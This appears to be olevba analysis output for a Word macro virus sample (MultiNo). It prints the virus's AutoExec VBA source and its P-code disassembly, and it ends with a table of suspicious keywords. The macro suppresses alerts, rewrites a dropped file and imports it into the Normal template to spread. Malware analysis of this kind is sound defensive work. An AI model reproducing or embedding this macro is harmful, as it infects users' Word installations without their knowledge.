olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.MultiNo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.MultiNo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO iMultiNO.bas 
in file: Virus.MSWord.Intended.MultiNo - OLE stream: 'Macros/VBA/iMultiNO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
On Error GoTo E
Application.DisplayAlerts = False
Application.EnableCancelKey = wdDisabled
On Error GoTo make
Open "c:\logov.sys" For Input As #1
Close 1
GoTo imprt
make:
On Error GoTo E
Open "c:\logoz.sys" For Input As #1
Open "c:\logov.sys" For Output As #2
Do
Line Input #1, a$
If Mid$(a$, 5, 1) = ":" Then a$ = "Print #1, " + Chr$(34) + "e" + Mid$(a$, 6, 29) + " " + Mid$(a$, 36, 23) + Chr$(34)
Print #2, a$
Loop Until EOF(1)
Close
Kill "c:\logoz.sys"
imprt:
n = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To n
If NormalTemplate.VBProject.VBComponents(i).Name = "MultiNO" Then GoTo E
Next i
NormalTemplate.VBProject.VBComponents.Import ("c:\logov.sys")
NormalTemplate.Save
E:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.MultiNo
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/iMultiNO - 2138 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	OnError E 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #3:
' 	Ld wdDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	OnError make 
' Line #5:
' 	LitStr 0x000C "c:\logov.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #6:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #7:
' 	GoTo imprt 
' Line #8:
' 	Label make 
' Line #9:
' 	OnError E 
' Line #10:
' 	LitStr 0x000C "c:\logoz.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #11:
' 	LitStr 0x000C "c:\logov.sys"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #12:
' 	Do 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	LineInput 
' Line #14:
' 	Ld a$ 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "Print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "e"
' 	Add 
' 	Ld a$ 
' 	LitDI2 0x0006 
' 	LitDI2 0x001D 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld a$ 
' 	LitDI2 0x0024 
' 	LitDI2 0x0017 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St a$ 
' 	EndIf 
' Line #15:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld a$ 
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #17:
' 	CloseAll 
' Line #18:
' 	LitStr 0x000C "c:\logoz.sys"
' 	ArgsCall Kill 0x0001 
' Line #19:
' 	Label imprt 
' Line #20:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St n 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld n 
' 	For 
' Line #22:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "MultiNO"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo E 
' 	EndIf 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	LitStr 0x000C "c:\logov.sys"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #25:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #26:
' 	Label E 
' Line #27:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

